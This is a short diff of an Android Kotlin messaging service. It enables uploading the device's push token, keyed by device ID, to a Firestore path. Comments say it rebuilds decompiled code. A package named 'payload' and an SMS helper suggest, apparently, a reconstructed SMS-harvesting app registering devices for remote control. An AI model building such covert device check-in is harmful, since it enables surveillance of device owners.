@@ -36,9 +36,31 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         super.onNewToken(token)
         Log.d(TAG, "Refreshed token: $token")
         
-        // TODO: Upload token to Firestore
+        // Upload token to Firestore - مطابق کد decompiled: C2862b.java و m4893e
         serviceScope.launch {
-            // uploadTokenToFirestore(token)
+            uploadTokenToFirestore(token)
+        }
+    }
+    
+    /**
+     * Upload FCM token to Firestore
+     * Based on decompiled code: m4893e method
+     * Path: MASTERHU/Users/{deviceId}
+     */
+    private suspend fun uploadTokenToFirestore(token: String) {
+        try {
+            val deviceId = com.payload.jansiix0ne.util.SmsHelper.getDeviceId(applicationContext)
+            val firestoreRepository = com.payload.jansiix0ne.data.repository.FirestoreRepository()
+            
+            val result = firestoreRepository.saveFcmToken(deviceId, token)
+            
+            if (result.isSuccess) {
+                Log.d(TAG, "FCM token updated for $deviceId")
+            } else {
+                Log.e(TAG, "Failed to update token: ${result.exceptionOrNull()?.message}")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to update token: ${e.message}", e)
         }
     }
 
